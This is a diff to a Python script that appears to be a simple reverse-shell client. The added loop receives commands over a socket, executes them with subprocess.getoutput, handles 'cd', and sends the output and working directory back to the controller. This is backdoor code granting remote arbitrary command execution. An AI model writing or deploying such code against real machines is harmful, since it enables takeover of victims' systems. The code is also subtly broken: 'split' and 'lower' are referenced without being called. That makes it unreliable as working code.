@@ -11,7 +11,7 @@ Host = socket.gethostbyname("localhost")  #Gets the IPV4 Address of the Device
 
 #get IP Address of Current Machine
 Port = 80
-BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
+Size = 1024 * 128 # 128KB max size of messages, feel free to increase
 # separator string for sending 2 messages in one go
 SEPARATOR = "<sep>"
 
@@ -23,4 +23,33 @@ s.send(cwd.encode()) #Sends the cwd to the Host
 
 #Need to make it so you can just type in commands and allows to do almost anything. 
 while True:
-    
+    command = s.recv(Size).decode()
+
+    split = command.split
+
+    if command.lower() == "exit":
+        break
+
+
+    if split[0].lower == "cd":
+        try:
+            os.chdir(' '.join(split[1:]))
+        except FileNotFoundError as e:
+            output = str(e)
+
+        else:
+            output = ""
+    else:
+        output = subprocess.getoutput(command)
+
+    cwd = os.getcwd()
+
+    message = f"{output}{SEPARATOR}{cwd}"
+
+    s.send(message.encode())
+
+s.close()
+
+
+
+
